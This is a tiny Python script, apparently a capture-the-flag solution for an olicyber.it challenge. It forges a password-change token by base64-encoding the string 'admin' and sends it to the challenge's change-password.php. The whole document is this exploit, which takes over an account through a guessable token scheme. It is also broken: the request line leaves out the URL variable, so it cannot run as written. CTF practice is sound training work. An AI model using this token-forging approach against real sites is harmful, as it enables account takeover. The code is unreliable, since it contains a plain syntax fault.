import requests, base64
payload = "admin"
site = "http://password-changer.challs.olicyber.it/change-password.php?token="
r = requests.get( + base64.b64encode(payload.encode()).decode())
print(r.text)